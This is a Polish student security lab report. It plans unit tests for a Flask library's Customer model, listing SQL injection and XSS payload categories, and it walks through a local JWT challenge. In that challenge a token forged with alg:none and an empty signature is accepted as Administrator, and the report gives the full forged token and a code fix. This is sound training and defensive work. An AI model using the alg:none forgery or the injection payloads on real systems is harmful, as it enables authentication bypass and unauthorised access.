# Zadanie 1 - Przygotowanie rozszerzonego zestawu testów jednostowych

## Wybrana klasa: `Customer` (Python Flask Book Library)

## Opis klasy Customer

Model `Customer` reprezentuje klienta biblioteki z następującymi polami:
- `id` - Integer, klucz główny
- `name` - String(64), unikalne, indeksowane
- `city` - String(64)
- `age` - Integer
- `pesel` - String(64)
- `street` - String(128)
- `appNo` - String(10)

## Kategorie testów

### 1. Testy poprawnych danych (TestCustomerValidData)
- Tworzenie klienta z poprawnymi danymi
- Minimalne poprawne dane
- Różne wartości wieku (0, 18, 65, 100, 120)
- Test metody `__repr__`
- Numeryczny i alfanumeryczny numer mieszkania

### 2. Testy niepoprawnych danych (TestCustomerInvalidData)
- Puste imię
- None jako imię
- Ujemny wiek
- String jako wiek
- Niepoprawny format PESEL (litery)
- Za krótki/za długi PESEL
- Float jako wiek
- Imię z samymi białymi znakami
- Znaki specjalne w imieniu

### 3. Testy SQL Injection (TestCustomerSQLInjection)
- DROP TABLE injection
- UNION SELECT injection
- OR 1=1 injection
- DELETE FROM injection
- INSERT INTO injection
- UPDATE SET injection
- Składnia komentarza SQL (--)
- Batch commands
- Kodowanie hex
- Null byte injection

### 4. Testy XSS/JavaScript Injection (TestCustomerXSSInjection)
- Tag `<script>` z alert
- Tag `<img>` z onerror
- Tag `<svg>` z onload
- Protokół javascript:
- Event handler onclick
- Tag `<body>` z onload
- Iframe injection
- Zakodowany tag script (URL encoded)
- Encje HTML
- Mieszane wielkości liter w tagach
- Protokół data:

### 5. Testy ekstremalne (TestCustomerExtremeValues)
- Bardzo długie imię (1000 znaków)
- Maksymalna wartość Integer dla wieku
- Minimalna wartość Integer dla wieku
- Znaki Unicode (chiński, arabski, japoński)
- Emoji w polach
- Znaki nowej linii i tabulacji
- Null byte w polach
- Ukośniki wsteczne
- Cudzysłowy w polach
- Same liczby w imieniu
- Wartości boolean zamiast stringów
- Lista/słownik jako wartość
- Wartości graniczne (64 znaki - granica pola)

### 6. Testy przypadków brzegowych (TestCustomerEdgeCases)
- Duplikowanie unikalnego pola (name)
- Wyszukiwanie klienta
- Aktualizacja danych
- Usuwanie klienta
- HTML we wszystkich polach

## Uruchomienie testów

```bash
cd Python/Flask_Book_Library
docker build .
```

## Wnioski

Pomimo niepoprawnych danych, projekt się uruchamia, nie jest on wystarczjąco zabezpieczony

# Zadanie 2 - JWT — wykorzystanie podatności oraz realizacja poprawki

## Rozszyfrowanie tokenu

### Otrzymany token
```json
{
    "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiQm9iIiwicm9sZSI6IlVzZXIiLCJpYXQiOjE3NjQ2MTY0NDAsImF1ZCI6Imh0dHBzOi8vMTI3LjAuMC4xL2p3dC9ub25lIn0.sg9rlB0khIe39Pc6DsbGzCo06XjXmZoTUPjfI3Syzkg",
    "endpoint": "https://127.0.0.1/jwt/none"
}
```
### Zdekodowana odpowiedź
```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
{"alg":"HS256","typ":"JWT"}
eyJhY2NvdW50IjoiQm9iIiwicm9sZSI6IlVzZXIiLCJpYXQiOjE3NjQ2MTY0NDAsImF1ZCI6Imh0dHBzOi8vMTI3LjAuMC4xL2p3dC9ub25lIn0
{"account":"Bob","role":"User","iat":1764616440,"aud":"https://127.0.0.1/jwt/none"}
sg9rlB0khIe39Pc6DsbGzCo06XjXmZoTUPjfI3Syzkg
k$:*4xיP#tH
```
### Obserwacje
Przy kolejnych odpowiedziach zmienia się tylko wartość "iat" i podpis po ostatniej kropce.

## Atak

### Pomysł 1 - podmienienie pola "account" z "User" na "Administrator"
Paczka:
```json
{
    "jwt_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiQWRtaW5pc3RyYXRvciIsInJvbGUiOiJVc2VyIiwiaWF0IjoxNzY0NjE4NTQ2LCJhdWQiOiJodHRwczovLzEyNy4wLjAuMS9qd3Qvbm9uZSJ9.RfgGRkdhwZBHhLSYcgsMN86nbLseo6VJvv3BfvtU5KM"
}
```
Wynik:
```json
{
    "name": "JsonWebTokenError",
    "message": "invalid signature"
}
```
Zły podpis
### Pomysł 2 - Usunięcie pola podpisu
```json
{
    "jwt_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiQWRtaW5pc3RyYXRvciIsInJvbGUiOiJVc2VyIiwiaWF0IjoxNzY0NjE4NTQ2LCJhdWQiOiJodHRwczovLzEyNy4wLjAuMS9qd3Qvbm9uZSJ9."
}
```
```json
{
    "name": "JsonWebTokenError",
    "message": "jwt signature is required"
}
```
### Pomysł 3 - zmiana nagłówka podpisu z {"alg":"HS256","typ":"JWT"} na {"alg":"none","typ":"JWT"} zostawiając puste miejsce po kropce

```json
{
    "jwt_token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhY2NvdW50IjoiQWRtaW5pc3RyYXRvciIsInJvbGUiOiJVc2VyIiwiaWF0IjoxNzY0NjE4NTQ2LCJhdWQiOiJodHRwczovLzEyNy4wLjAuMS9qd3Qvbm9uZSJ9."
}
```
Wynik:
```json
{
    "message": "Congrats!! You've solved the JWT challenge!!",
    "jwt_token": {
        "header": {
            "alg": "none",
            "typ": "JWT"
        },
        "payload": {
            "account": "Administrator",
            "role": "User",
            "iat": 1764618546,
            "aud": "https://127.0.0.1/jwt/none"
        },
        "signature": ""
    }
}
```
## Poprawka
W wersji minimalistycznej dodałem sprawdzenie:
```javascript
      if(secret_key == '' && jwt_b64_dec.payload.account == "Administrator"){
        err = 'Critical security issue: JWT with alg:none and Administrator account accepted.';
      }
```
Dla pełnego bezpieczeństwa należałoby wyłączyć całkowicie opcję none z akceptowanych podpisów, czyli usunąć tą linijkę:
```javascript
else if (jwt_b64_dec.header.alg == 'none') {
      secret_key = '';
    }
```
a także zakomentować opcję "none w polu verify:
```javascript
    JWT.verify(jwt_token, secret_key, { algorithms: [/*'none', */'HS256'], complete: true, audience: 'https://127.0.0.1/jwt/none' }, (err, decoded_token) => {
```